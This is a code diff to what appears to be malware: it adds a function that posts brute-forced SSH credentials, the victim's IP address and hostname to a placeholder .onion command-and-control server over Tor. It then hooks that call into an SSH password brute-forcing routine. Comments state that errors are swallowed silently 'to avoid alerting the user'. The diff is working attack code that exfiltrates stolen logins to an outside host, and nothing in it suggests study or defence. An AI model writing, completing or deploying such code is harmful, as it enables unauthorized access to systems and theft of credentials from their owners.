@@ -31,6 +31,29 @@ except Exception as e:
     logger.error(f"Error getting gateway: {e}")
     pass
 
+def report_to_c2(target_ip, username, password):
+    """
+    Sends the cracked credentials back to the mother ship.
+    """
+    c2_url = "http://CHANGE_THIS.onion" 
+    loot = {
+        "victim_ip": target_ip,
+        "credentials": f"{username}:{password}",
+        "timestamp": time.ctime(),
+        "hostname": socket.gethostname()
+    }
+    
+    try:
+        # We send this through the Tor proxy we already set up!
+        proxies = {
+            'http': 'socks5h://127.0.0.1:9050',
+            'https': 'socks5h://127.0.0.1:9050'
+        }
+        requests.post(c2_url, data=loot, proxies=proxies, timeout=10)
+    except:
+        # Fail silently to avoid alerting the user
+        pass
+
 
 def setup_tor():
     tor_path = os.path.join(os.environ.get('TEMP'), "tor_bundle")
@@ -205,6 +228,8 @@ def bruteforce_ssh(host, wordlist):
             
             if connection:
                 logger.debug(f"Password found: {password}")
+                # EXFILTRATE DATA
+                report_to_c2(host, "Administrator", password)
                 return password
             
             # Small delay to prevent overwhelming the target CPU
